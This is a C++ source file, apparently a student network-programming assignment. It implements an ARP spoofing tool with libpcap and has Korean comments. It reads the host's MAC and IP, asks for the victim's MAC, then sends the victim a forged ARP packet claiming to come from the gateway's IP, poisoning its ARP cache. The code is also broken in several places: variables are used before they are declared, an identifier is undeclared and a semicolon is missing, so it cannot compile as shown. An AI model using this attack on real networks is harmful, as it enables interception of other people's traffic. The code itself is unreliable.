#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>

// MAC 주소를 문자열로 반환하는 함수
char* get_mac_address(const char *iface_name) {
    int fd;
    struct ifreq ifr;
    char *mac_str = (char *)malloc(18); // "xx:xx:xx:xx:xx:xx" + NULL

    if (mac_str == NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    // 소켓 생성
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        free(mac_str);
        exit(EXIT_FAILURE);
    }

    // 인터페이스 이름 설정
    strncpy(ifr.ifr_name, iface_name, IFNAMSIZ - 1);

    // MAC 주소 가져오기
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        free(mac_str);
        exit(EXIT_FAILURE);
    }

    // MAC 주소를 문자열로 변환
    unsigned char *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    snprintf(mac_str, 18, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    close(fd);
    return mac_str;
}

char* get_ip_address(const char *iface_name) {
    struct ifaddrs *ifaddr, *ifa;
    char *ip_str = NULL;

    // 네트워크 인터페이스 주소를 가져옴
    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    // 인터페이스 목록을 순회
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        // 인터페이스 이름이 일치하고 IPv4인 경우
        if (strcmp(ifa->ifa_name, iface_name) == 0 && ifa->ifa_addr->sa_family == AF_INET) {
            ip_str = (char *)malloc(INET_ADDRSTRLEN); // "xxx.xxx.xxx.xxx" + NULL
            if (ip_str == NULL) {
                perror("malloc");
                exit(EXIT_FAILURE);
            }

            // IP 주소를 문자열로 변환
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            inet_ntop(AF_INET, &addr->sin_addr, ip_str, INET_ADDRSTRLEN);
            break;
        }
    }

    freeifaddrs(ifaddr);

    // IP 주소를 찾지 못했을 경우
    if (ip_str == NULL) {
        fprintf(stderr, "Could not find IP address for interface %s\n", iface_name);
        exit(EXIT_FAILURE);
    }

    return ip_str;
}


void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}
int main(int argc, char* argv[])
{
	char ifname[100];
	strcpy(ifname, argv[1]);
	char sender[100][100];
	char target[100][100];
	int s_index = 0;
	int t_index = 0;
	for(int i=2; i<argc; i++)
	{
		//printf("%d\n", i);
		if(i % 2== 0)
		{
            strncpy(sender[s_index], argv[i], 15);
            sender[s_index][15] = '\0';
            //printf("sender: %s\n", sender[s_index]);
            s_index++;
		}
		else
		{
			strncpy(target[t_index], argv[i], 15);
            target[t_index][15] = '\0';
            //printf("target: %s\n", target[t_index]);
            t_index++;
		}
	}
	for(int i=0; i < s_index; i++)
	{
		arp_packat(ifname, sender[i], target[i])
	}

	return 0;
}
int arp_packat(char* ifname, char* gateway_addr, char* victim_addr) {


	char* dev = ifname;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	char *my_mac = get_mac_address(dev);
	char *my_ip = get_ip_address(dev);
	char victim_mac[100];

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //victim MAC
	packet.eth_.smac_ = Mac(my_mac); //my MAC
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac); //my MAC
	packet.arp_.sip_ = htonl(Ip(my_ip)); //my IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //victim MAC
	packet.arp_.tip_ = htonl(Ip(victim_addr)); //victim IP

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}


	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		struct EthHdr *eth = (struct EthHdr *)packet;
		if(eth->type == 0x0806)
		{
			victim_mac = eth->smac;
			break;
		}
	}
	

	
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(victim_mac); //victim MAC
	packet.eth_.smac_ = Mac(my_mac); //my MAC
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac("00:00:00:00:00:00"); //my MAC
	packet.arp_.sip_ = htonl(Ip(gateway_addr)); //gateway
	packet.arp_.tmac_ = Mac(victim_mac); //victim MAC
	packet.arp_.tip_ = htonl(Ip(victim_addr)); //victim IP

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
